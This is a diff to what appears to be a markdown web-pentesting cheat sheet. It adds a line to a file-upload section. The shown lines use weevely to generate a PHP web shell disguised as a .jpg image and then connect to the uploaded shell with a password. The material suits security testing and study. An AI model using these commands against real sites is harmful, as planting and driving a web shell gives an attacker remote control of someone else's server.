@@ -85,6 +85,7 @@ echo "<pre>$output</pre>";
 ### OR
 - __you can use weevely to generate php script in the formate of .jpg__
 - __```weevely generate password ~/Desktop/shell.jpg```__
+- __```weevely <url_where_the_file_uploaded>/shell.jpg/shell.php password```__
 
 # Check list
 - [x] [Open redirect](open_redirect.md)
